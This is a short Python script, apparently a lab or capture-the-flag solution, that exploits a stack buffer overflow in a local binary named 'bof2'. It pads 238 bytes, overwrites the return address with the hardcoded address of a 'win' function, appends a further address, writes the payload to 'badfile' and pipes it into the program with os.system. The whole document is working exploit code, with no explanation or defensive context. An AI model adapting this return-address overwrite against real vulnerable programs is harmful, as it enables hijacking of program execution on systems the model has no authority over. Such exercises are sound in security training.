import struct
import os 

debug = 0x804a034
str_c = 268

dst = 0xbffff00a
dst_eip = 238
win = 0x804852b

atk_vector = "A"*dst_eip
atk_vector += struct.pack("I", win)
atk_vector += "A"*(str_c - len(atk_vector))
atk_vector += struct.pack("I", debug)

f = open("badfile", 'w+')
f.write(atk_vector)
f.close()

argv = 0

f = open("argv", 'w+')
f.write("%d" %argv)
f.close()


os.system("cat {} | ./bof2 {}".format('badfile', argv))
